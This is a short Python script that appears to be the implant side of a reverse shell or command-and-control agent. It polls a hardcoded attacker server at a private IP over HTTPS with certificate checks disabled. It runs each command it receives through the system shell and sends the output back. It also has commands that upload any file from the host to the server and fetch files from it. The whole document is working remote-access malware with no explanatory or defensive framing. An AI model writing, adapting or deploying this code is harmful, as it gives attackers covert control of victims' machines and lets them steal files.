import requests
import subprocess
import time
import os

requests.packages.urllib3.disable_warnings()  # Disable SSL verify warnings

HOST_NAME = '192.168.246.128'
PORT_NUMBER = 443
URL = f'https://{HOST_NAME}:{PORT_NUMBER}'

while True:
    session = requests.session()
    session.verify = False

    r = session.get(URL)
    command = r.text

    if 'quit' in command:
        break
    elif 'get' in command:
        get, path = command.split('&')

        if os.path.exists(path):
            files = {'file': open(path, 'rb')}
            session.post(URL, files=files, headers={'Function': 'get_file'})
        else:
            post_response = session.post(url=URL, data='[X] File not found!')
    elif 'put' in command:
        put, path = command.split('&')
        print(URL + path)
        post_response = session.post(URL + path, headers={'Function': 'put_file'})

        with open(path.split('/')[-1], 'wb') as local_file:
            for chunk in post_response.iter_content(chunk_size=128):
                local_file.write(chunk)
    else:
        CMD = subprocess.Popen(command,
                               shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE
                               )
        post_response = session.post(url=URL, data=CMD.stdout.read())
        post_response_error = session.post(url=URL, data=CMD.stderr.read())

    time.sleep(1)
